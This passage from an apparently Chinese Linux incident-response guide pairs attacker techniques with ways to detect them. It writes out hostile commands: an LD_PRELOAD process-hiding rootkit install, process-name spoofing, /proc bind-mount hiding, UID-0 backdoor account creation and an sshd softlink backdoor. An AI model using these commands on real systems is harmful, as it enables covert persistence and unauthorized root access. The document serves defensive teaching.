+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载的恶意的动态库文件</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line">正克隆到 <span class="string">&#x27;libprocesshider&#x27;</span>...</span><br><span class="line">remote: Enumerating objects: 30, <span class="keyword">done</span>.</span><br><span class="line">remote: Total 30 (delta 0), reused 0 (delta 0), pack-reused 30</span><br><span class="line">Unpacking objects: 100% (30/30), <span class="keyword">done</span>.</span><br><span class="line">$ <span class="built_in">cd</span> libprocesshider/</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">evil_script.py  Makefile  processhider.c  README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编译动态库文件,注意操作系统需要拥有gcc的编译环境</span></span><br><span class="line">$ make</span><br><span class="line">gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">evil_script.py  libprocesshider.so  Makefile  processhider.c  README.md</span><br><span class="line"></span><br><span class="line"><span class="comment"># 移动文件libprocesshider.so到/usr/local/lib文件夹下</span></span><br><span class="line">$ <span class="built_in">mv</span> libprocesshider.so /usr/local/lib</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把它加载到全局动态连接库</span></span><br><span class="line">$ <span class="built_in">echo</span> /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></div></figure>
+
+<pre><code>        + 在正常情况下的ps的显示内容
+</code></pre>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个用于测试的attack.py</span></span><br><span class="line">$ vim attack.py</span><br><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line">import os</span><br><span class="line">os.system(<span class="string">&quot;ping www.baidu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行这个attack.py文件</span></span><br><span class="line">$ python attack.py</span><br><span class="line">PING www.a.shifen.com (112.80.248.76) 56(84) bytes of data.</span><br><span class="line">64 bytes from 112.80.248.76 (112.80.248.76): icmp_seq=1 ttl=128 <span class="keyword">time</span>=20.1 ms</span><br><span class="line">64 bytes from 112.80.248.76 (112.80.248.76): icmp_seq=2 ttl=128 <span class="keyword">time</span>=27.6 ms</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在另一个控制台下查看相应的进程</span></span><br><span class="line">$ ps -ef | grep <span class="string">&quot;ping\|python&quot;</span></span><br><span class="line">root       9061   7328  0 09:30 pts/0    00:00:00 ping www.baidu.com</span><br><span class="line">root       9241   7328  0 10:23 pts/0    00:00:00 python attack.py</span><br></pre></td></tr></table></div></figure>
+
+<pre><code>        + 以上的内容中如果说我们要设置隐藏自己的进程，就需要在编译器前修改processhider.c文件内容。
+</code></pre>
+<figure class="highlight c"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 我们只需要修改processhider.c中的下面这部分内容。</span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* process_to_filter = <span class="string">&quot;python&quot;</span>;  </span><br><span class="line">#    在这里可以设置隐藏的进程，注意这里面我写的是python，因为我的attack.py脚步通过python attack.py</span><br><span class="line"># 的方式执行。如果说赋予attack.py可执行的权限，并且直接通过./attack.py的方式执行，则我们可以将上面</span><br><span class="line"># 的命令修改为：<span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* process_to_filter = <span class="string">&quot;attack.py&quot;</span>; </span><br><span class="line">#    在修改完以上的内容后重复编译-&gt; 移动 -&gt; 链接</span><br><span class="line"></span><br><span class="line"># 如果在某些情况下编译程序不通过则：</span><br><span class="line"> # <span class="number">1.</span>删除最后两行中的其中一行</span><br><span class="line">	DECLARE_READDIR(dirent64, readdir64);</span><br><span class="line">	DECLARE_READDIR(dirent, readdir);</span><br><span class="line"> # <span class="number">2.</span> 添加环境变量</span><br><span class="line">	vi /etc/profile</span><br><span class="line">    export LD_PRELOAD=/usr/local/lib/libprocesshider.so</span><br></pre></td></tr></table></div></figure>
+
+<pre><code>        + 此后一个命令行下执行attack.py脚本，一个命令行下通过ps查看。
+</code></pre>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 输出的结果中没有含有运行的测试脚本</span></span><br><span class="line">[root@localhost libprocesshider]# ps -ef | grep <span class="string">&quot;attack.py\|ping&quot;</span></span><br><span class="line">root       9061   7328  0 09:30 pts/0    00:00:00 ping www.baidu.com</span><br><span class="line">root       9349   9348  0 10:40 pts/0    00:00:00 ping www.baidu.com</span><br></pre></td></tr></table></div></figure>
+
+<p>排查思路：</p>
+<ul>
+<li>env | grep LD_PRELOAD，检查环境变量里有没有可疑动态库</li>
+<li>cat &#x2F;etc&#x2F;ld.so.preload，正常系统这个文件为空或不存在</li>
+<li>直接 ls &#x2F;proc | grep ^[0-9] 遍历进程目录，与 ps 输出对比，多出来的就是被 hook 隐藏的</li>
+<li>cat &#x2F;proc&#x2F;<PID>&#x2F;maps 看进程加载了哪些 .so，出现非系统库就是证据</li>
+<li>rkhunter &#x2F; chkrootkit 全盘查（见 7.1 工具篇）</li>
+</ul>
+<p>3、伪造进程名（exec -a）</p>
+<p>原理：进程名和实际文件可以不一致，<code>exec -a</code> 能把 python 进程显示成 bash，迷惑肉眼排查。攻击者写脚本时也习惯取迷惑性的名字（如 sshd、kworkerds 之类），配合伪造进程名更难被发现。</p>
+<p>实验思路：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> -a bash python ./attack.py</span><br><span class="line"><span class="comment"># ps -ef | grep bash 会看到名为 bash 的进程，实际是 python 在跑</span></span><br></pre></td></tr></table></div></figure>
+
+<p>排查思路：</p>
+<ul>
+<li>对没有印象的进程名，用 ls -l &#x2F;proc&#x2F;<PID>&#x2F;exe 看真实执行文件</li>
+<li>readlink &#x2F;proc&#x2F;<PID>&#x2F;exe、cat &#x2F;proc&#x2F;<PID>&#x2F;cmdline 拿到真实路径和启动参数</li>
+</ul>
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/1610518916117-fa508cae-5f90-4c93-b4f3-ded615b74915.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/1610518916117-fa508cae-5f90-4c93-b4f3-ded615b74915.png"  alt="伪造进程名排查（&#x2F;proc&#x2F;exe）" lazyload></a></p>
+<p>4、挂载隐藏（mount –bind）</p>
+<p>原理：把空目录挂载覆盖到 &#x2F;proc&#x2F;<PID> 上，ps 读到的就是空目录，进程从输出里消失。</p>
+<p>实验思路：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setenforce 0                            <span class="comment"># 先关 SELinux</span></span><br><span class="line">mount -o <span class="built_in">bind</span> /root/empty/ /proc/&lt;PID&gt;/</span><br><span class="line"><span class="comment"># ps -ef 里就看不到该进程了</span></span><br></pre></td></tr></table></div></figure>
+
+<p>排查思路：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/$$/mountinfo    <span class="comment"># 看有没有挂到 /proc 下进程目录的异常记录</span></span><br><span class="line"><span class="built_in">cat</span> /proc/mounts</span><br><span class="line">umount /proc/&lt;PID&gt;/       <span class="comment"># 卸载后进程恢复可见</span></span><br></pre></td></tr></table></div></figure>
+
+<p>正常系统 &#x2F;proc 下不会出现 bind 挂载，<mark>mountinfo 里出现 &#x2F;proc&#x2F;&lt;数字&gt; 的条目基本可以定性</mark>。</p>
+<h3 id="2-3-异常外连排查（挖矿案例）"><a href="#2-3-异常外连排查（挖矿案例）" class="headerlink" title="2.3 异常外连排查（挖矿案例）"></a>2.3 异常外连排查（挖矿案例）</h3><blockquote>
+<p>这里以<strong>挖矿病毒</strong>事件来记录</p>
+</blockquote>
+<p>这里的挖矿占用并没有高达100%， 因为现在有的挖矿不再像之前那样高占用，高占用容易被注意到。</p>
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/PixPin_2025-11-05_14-57-11.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/PixPin_2025-11-05_14-57-11.png"  lazyload></a></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -p PID号</span><br></pre></td></tr></table></div></figure>
+
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/PixPin_2025-11-05_14-56-23.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/PixPin_2025-11-05_14-56-23.png"  lazyload></a></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ss -tupan | grep <span class="string">&quot;kworkerds&quot;</span>   <span class="comment"># kworkerds为文件名</span></span><br></pre></td></tr></table></div></figure>
+
+
+
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/PixPin_2025-11-05_15-00-32.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/PixPin_2025-11-05_15-00-32.png"  lazyload></a></p>
+<p><strong>如上图，看到存在外连情况，但是有时候获取不到外连情况，说明可能存在一个心跳机制（比如说每30秒尝试外连一次进行挖矿，而不是持续连接，这也是挖矿的一个特征）。</strong></p>
+<p><a class="simple-lightbox" href="/imgs/linux-intrusion-response/PixPin_2025-11-05_15-01-42.png"><img   src="/images/loading.svg" data-src="/imgs/linux-intrusion-response/PixPin_2025-11-05_15-01-42.png"  lazyload></a></p>
+<h2 id="三、账号与访问后门排查"><a href="#三、账号与访问后门排查" class="headerlink" title="三、账号与访问后门排查"></a>三、账号与访问后门排查</h2><h3 id="3-1-用户与权限"><a href="#3-1-用户与权限" class="headerlink" title="3.1 用户与权限"></a>3.1 用户与权限</h3><p>账号排查分四步：看当前登录、对用户文件、查可疑账号、翻历史登录。</p>
+<p><strong>1、当前登录用户</strong></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">who</span>      <span class="comment"># 查看当前登录用户（tty 本地登陆、pts 远程登录）</span></span><br><span class="line"><span class="built_in">who</span></span><br><span class="line">root     pts/0        2020-07-27 10:48 (192.168.222.1)</span><br><span class="line"><span class="comment"># 输出：用户名 终端 登录时间 (来源IP)</span></span><br><span class="line"></span><br><span class="line">w        <span class="comment"># 查看当前每个登录用户的行为</span></span><br><span class="line">w</span><br><span class="line"> 09:21:59 up 22:35,  1 user,  load average: 0.00, 0.01, 0.05</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE    JCPU   PCPU WHAT</span><br><span class="line">root     pts/0    192.168.222.1    Mon10    1:43    0.34s  0.34s -bash</span><br><span class="line"><span class="comment"># LOGIN@ 登录时间；IDLE 闲置时间；JCPU 所有进程占用 CPU 时间；PCPU 当前进程占用 CPU 时间；WHAT 当前执行的进程</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">users</span>    <span class="comment"># 当前连接用户的用户名</span></span><br><span class="line"><span class="built_in">uptime</span>   <span class="comment"># 系统运行多久、多少用户、负载</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>2、用户信息文件（&#x2F;etc&#x2F;passwd、&#x2F;etc&#x2F;shadow）</strong></p>
+<p>&#x2F;etc&#x2F;passwd 存用户基础信息（默认权限 644，任何用户可读，只有 root 可改）：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line"><span class="comment"># 用户名：密码占位符：UID：GID：说明：家目录：登录 shell</span></span><br><span class="line"><span class="comment"># 密码字段为 x 表示密码在 shadow；若为空（::）则是无密码账号，需重点排查</span></span><br></pre></td></tr></table></div></figure>
+
+<p>&#x2F;etc&#x2F;shadow 存密码哈希（默认权限 600，仅 root 可读）：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root:$6$oGs1PqhL2p3ZetrE<span class="variable">$X7o7bzoouHQVSEmSgsYN5UD4</span>.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::</span><br><span class="line"><span class="comment"># 用户名：加密密码：最后修改日期：修改间隔：有效期：警告天数：宽限天数：失效时间：保留</span></span><br></pre></td></tr></table></div></figure>
+
+<p>Tips：</p>
+<ul>
+<li>密码哈希格式：$6$&#x3D;SHA-512、$5$&#x3D;SHA-256、$1$&#x3D;MD5、$2y$&#x3D;bcrypt；只有带密码哈希（$1&#x2F;$6 开头）的用户才能远程登录</li>
+<li>特殊服务用户（apache、www-data 等）家目录在 &#x2F;var&#x2F;www 之类，登录 shell 一般是 &#x2F;sbin&#x2F;nologin（RHEL）或 &#x2F;usr&#x2F;sbin&#x2F;nologin（Debian）</li>
+<li>&#x2F;bin&#x2F;zsh、&#x2F;bin&#x2F;bash、&#x2F;bin&#x2F;sh 都是常见登录 shell，也会见到 &#x2F;usr&#x2F;bin 前缀</li>
+<li>&#x2F;etc&#x2F;passwd 最小权限 444、&#x2F;etc&#x2F;shadow 最小权限 400</li>
+</ul>
+<p><strong>3、可疑账号排查</strong></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">awk -F: <span class="string">&#x27;$3==0&#123;print $1&#125;&#x27;</span> /etc/passwd        <span class="comment"># UID=0 特权用户</span></span><br><span class="line">awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow        <span class="comment"># 可远程登录的账号</span></span><br><span class="line">more /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span>   <span class="comment"># 有 sudo 权限的账号</span></span><br><span class="line"><span class="built_in">cat</span> /etc/group | grep root                   <span class="comment"># root 组里是否有陌生人</span></span><br><span class="line">awk -F: <span class="string">&#x27;($2==&quot;&quot;)&#123;print&#125;&#x27;</span> /etc/shadow      <span class="comment"># 空密码账号</span></span><br><span class="line">awk -F: <span class="string">&#x27;&#123;print $3&#125;&#x27;</span> /etc/passwd | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -d   <span class="comment"># 重复 UID</span></span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li>sudoers 三列含义：<code>root ALL=(ALL) ALL</code>——第一个 ALL 允许从任何终端执行、第二个 (ALL) 允许以任何用户身份、第三个 ALL 允许执行所有命令；<code>NOPASSWD: ALL</code> <mark>免密 sudo 风险更高</mark></li>
+<li>&#x2F;etc&#x2F;sudoers 默认权限 440（仅可读），发现可写权限要警惕</li>
+<li>攻击者常把 sudoers 改成可写（如 chmod 744）再往里面塞提权规则，ll &#x2F;etc&#x2F;sudoers 看权限就能发现</li>
+<li>&#x2F;etc&#x2F;group 里 <code>root:x:0:</code> 后面没列出用户是正常的（root 初始用户不显示），<mark>出现非 root 用户名就要警惕</mark></li>
+<li>确认可疑后禁用&#x2F;删除：<code>usermod -L user</code>（&#x2F;etc&#x2F;shadow 第二栏变为 !）、<code>userdel user</code>、<code>userdel -r user</code>（连家目录一起删）</li>
+</ul>
+<p><strong>4、攻击者常用的建号手法（对照排查）</strong></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">useradd attack;<span class="built_in">echo</span> <span class="string">&#x27;attack:123456&#x27;</span>|chpasswd</span><br><span class="line"><span class="comment"># chpasswd 批量改密：chpasswd &lt; user.pass</span></span><br><span class="line"></span><br><span class="line">useradd -p <span class="string">&quot;<span class="subst">$(openssl passwd 123456)</span>&quot;</span> guest</span><br><span class="line"><span class="comment"># 创建用户并用 openssl 加密密码</span></span><br><span class="line"></span><br><span class="line">useradd -p <span class="string">&quot;<span class="subst">$(openssl passwd 123456)</span>&quot;</span> -u 0 -o -g root -G root -d /usr/bin/guest guest</span><br><span class="line"><span class="comment"># -u 0 -o：创建 UID=0 的特权用户</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;guest:x:0:0::/:/bin/sh&quot;</span> &gt;&gt; /etc/passwd</span><br><span class="line"><span class="comment"># 直接往 passwd 追加 UID=0 的用户（最粗暴的手法）</span></span><br></pre></td></tr></table></div></figure>
+
+<ul>
+<li>基本组与附加组：创建用户时默认生成一个同名基本组（不能移除），其他组都是附加组（可删除）；一个用户只能有一个基本组，可属于多个附加组。攻击者常用 -G root <mark>把后门用户塞进 root 组</mark></li>
+<li>排查时注意 -g（基本组）和 -G（附加组）的差异</li>
+</ul>
+<p><strong>5、历史登录信息</strong></p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">last       <span class="comment"># /var/log/wtmp：所有登录/注销/系统启动重启关机记录</span></span><br><span class="line">lastb      <span class="comment"># /var/log/btmp：失败登录记录（爆破痕迹）</span></span><br><span class="line">lastlog    <span class="comment"># /var/log/lastlog：每个用户最后一次登录时间</span></span><br></pre></td></tr></table></div></figure>
+
+<h3 id="3-2-SSH-后门排查"><a href="#3-2-SSH-后门排查" class="headerlink" title="3.2 SSH 后门排查"></a>3.2 SSH 后门排查</h3><figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -la /root/.ssh/ /home/*/.ssh/          <span class="comment"># 公钥目录</span></span><br><span class="line"><span class="built_in">cat</span> /root/.ssh/authorized_keys            <span class="comment"># 有没有陌生公钥</span></span><br><span class="line">grep -r <span class="string">&quot;ssh-rsa\|ssh-ed25519&quot;</span> /root /home   <span class="comment"># 全盘找植入的公开钥</span></span><br><span class="line"><span class="built_in">cat</span> /etc/ssh/sshd_config | grep -E <span class="string">&quot;AuthorizedKeysFile|PermitRootLogin|PasswordAuthentication|UsePAM&quot;</span></span><br><span class="line"><span class="built_in">stat</span> /etc/ssh/sshd_config                 <span class="comment"># sshd 配置是否被改</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>OpenSSH 替换后门（记录密码 + 万能密码）：</strong> 攻击者用打了补丁的 openssh 重新编译安装，达到记录账号密码、万能密码登录的效果。排查思路：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、检查 sshd 程序本身是否被替换：正常是 /usr/sbin/sshd 二进制，若变成脚本或时间异常就是后门</span></span><br><span class="line"><span class="built_in">ls</span> -al /usr/sbin/sshd</span><br><span class="line"><span class="built_in">cat</span> /usr/sbin/sshd                        <span class="comment"># SSH wrapper 后门：内容是 perl 脚本而非 ELF</span></span><br><span class="line"><span class="built_in">stat</span> /usr/sbin/sshd /usr/bin/ssh          <span class="comment"># 与干净系统对比时间</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、用 strace 跟踪 sshd 进程，找出记录密码的文件</span></span><br><span class="line">ps aux | grep sshd                        <span class="comment"># 获取可疑进程 PID</span></span><br><span class="line">strace -o aa -ff -p PID                   <span class="comment"># 跟踪 sshd 的读写系统调用</span></span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied | grep WR</span><br><span class="line"><span class="comment"># 输出里以读写（WR）方式打开的文件就是后门记录密码的位置（如 /tmp/.sshlog）</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>PAM 后门（万能密码）：</strong> 修改 pam_unix.so 认证逻辑实现万能密码 + 记录密码。核心排查点：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">stat</span> /lib64/security/pam_unix.so          <span class="comment"># 64位系统</span></span><br><span class="line"><span class="built_in">stat</span> /lib/security/pam_unix.so            <span class="comment"># 32位系统</span></span><br><span class="line"><span class="comment"># pam_unix.so 修改时间异常（与系统安装时间不符）就要怀疑</span></span><br><span class="line"><span class="comment"># 对比：rpm -V pam 或用干净系统的 pam_unix.so 做 md5 对比</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>SSH 软链接后门：</strong> 利用 pam_rootok 机制，<code>ln -sf /usr/sbin/sshd /tmp/su; /tmp/su -oPort=8888</code> 多开一个任意密码登录的 SSH 端口。排查：<code>netstat -antpl</code> 看有没有<strong>多余的 sshd 监听端口</strong>；<code>ls -l /tmp/su</code> 等非常规软链接。</p>
+<h2 id="四、持久化排查"><a href="#四、持久化排查" class="headerlink" title="四、持久化排查"></a>四、持久化排查</h2><h3 id="4-1-开机启动项"><a href="#4-1-开机启动项" class="headerlink" title="4.1 开机启动项"></a>4.1 开机启动项</h3><p>开机启动分两套体系：<strong>CentOS6 及以前</strong>靠”运行级别 + init.d + rc.d”，<strong>CentOS7 开始</strong>靠 systemd（systemctl）。排查前先 <code>cat /etc/redhat-release</code> 分清版本，再按对应体系看。</p>
+<p><strong>一、CentOS6 体系：运行级别 + init.d + rc.d</strong></p>
+<p>1、什么是运行级别：Linux 给系统定义了 7 种运行状态，开机进入哪个级别，就只启动该级别对应的服务：</p>
+<div class="table-scroll"><table>
+<thead>
+<tr>
+<th>运行级别</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>关机（默认级别不能设 0，否则起不来）</td>
+</tr>
+<tr>
+<td>1</td>
+<td>单用户模式（root 维护，禁远程登录，类似安全模式）</td>
+</tr>
+<tr>
+<td>2</td>
+<td>多用户命令行（不含 NFS）</td>
+</tr>
+<tr>
+<td>3</td>
+<td>完全多用户命令行（标准字符界面，服务器常用）</td>
+</tr>
+<tr>
+<td>4</td>
+<td>保留</td>
+</tr>
+<tr>
+<td>5</td>
+<td>图形界面（X11）</td>
+</tr>
+<tr>
+<td>6</td>
+<td>重启（默认级别不能设 6）</td>
+</tr>
+</tbody></table></div>
+<p>查看&#x2F;切换：<code>runlevel</code> 查看当前级别，<code>init 3</code> 切到命令行模式。</p>
+<p>2、开机进哪个级别：CentOS6 由 &#x2F;etc&#x2F;inittab 指定：</p>
+<figure class="highlight plaintext"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/inittab</span><br><span class="line">id=3:initdefault      # 开机直接进入运行级别 3</span><br></pre></td></tr></table></div></figure>
+
+<p>3、每个级别启动哪些服务：&#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d&#x2F; 目录对应各运行级别，里面的文件名是软链接，指向 &#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F; 下的真实服务脚本（&#x2F;etc&#x2F;init.d 是它的软链接）。</p>
+<p>软链接命名规则：<strong><mark>S&#x2F;K + 两位优先级数字 + 服务名</mark></strong></p>
+<ul>
+<li>S（start）&#x3D; 进入该级别时启动，如 S10network</li>
+<li>K（kill）&#x3D; 进入该级别时关闭，如 K50netconsole</li>
+<li>中间的数字是启动&#x2F;关闭优先级，1~100 越小越先执行</li>
+</ul>
+<p>实例：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ll /etc/rc.d/rc1.d/</span><br><span class="line">lrwxrwxrwx. 1 root root 20 5月  20 20:25 K50netconsole -&gt; ../init.d/netconsole</span><br><span class="line">lrwxrwxrwx. 1 root root 17 5月  20 20:25 K90network -&gt; ../init.d/network</span><br><span class="line"></span><br><span class="line">[root@localhost ~]# <span class="built_in">ln</span> -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</span><br><span class="line"><span class="comment"># 把 sshd 脚本挂到 3 级别：S=进入级别 3 时启动，100=启动优先级</span></span><br></pre></td></tr></table></div></figure>
+
+<p><strong>二、CentOS7 体系：systemd</strong></p>
+<p>CentOS7 不再用运行级别 + init.d 管理服务，改用 systemd。原来的 service 命令会被重定向到 systemctl：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# service sshd start</span><br><span class="line">Redirecting to /bin/systemctl start sshd.service</span><br><span class="line"><span class="comment"># CentOS7 的 init.d 下没有 sshd 脚本，service 被重定向到 systemctl</span></span><br></pre></td></tr></table></div></figure>
+
+<p>服务单元文件的位置（相当于”服务脚本”）：</p>
+<ul>
+<li>&#x2F;usr&#x2F;lib&#x2F;systemd&#x2F;system&#x2F;：系统自带（开机不登录就运行的程序都在这）</li>
+<li>&#x2F;etc&#x2F;systemd&#x2F;system&#x2F;：管理员自定义，优先级更高，攻击者常在这放后门服务</li>
+</ul>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ll /usr/lib/systemd/system | grep sshd</span><br><span class="line">-rw-r--r--. 1 root root 313 8月   7 2017 sshd-keygen.service</span><br><span class="line">-rw-r--r--. 1 root root 373 7月  24 16:34 sshd.service</span><br><span class="line">-rw-r--r--. 1 root root 260 8月   7 2017 sshd@.service</span><br><span class="line">-rw-r--r--. 1 root root 181 8月   7 2017 sshd.socket</span><br></pre></td></tr></table></div></figure>
+
+<p>systemctl enable 的实现机制：在 multi-user.target.wants（对应运行级别 3）等目录下给服务文件建软链接，开机进入该 target 时服务自动启动。自启动管理命令（enable&#x2F;disable&#x2F;status&#x2F;list-unit-files 等）见 4.3。</p>
+<p><strong>三、入侵排查</strong></p>
+<p>1、看开机启动项文件：</p>
+<figure class="highlight bash"><div class="table-scroll"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">more /etc/rc.local                                    <span class="comment"># CentOS6：rc.local 内容</span></span><br><span class="line"><span class="built_in">ls</span> -l /etc/rc.d/rc3.d/                                <span class="comment"># CentOS6：3 级别 S/K 软链接</span></span><br><span class="line">systemctl list-unit-files --<span class="built_in">type</span>=service | grep enabled   <span class="comment"># CentOS7：开机自启服务</span></span><br><span class="line"><span class="built_in">ls</span> -l /usr/lib/systemd/system/multi-user.target.wants/    <span class="comment"># CentOS7：自启软链接目录</span></span><br></pre></td></tr></table></div></figure>
+
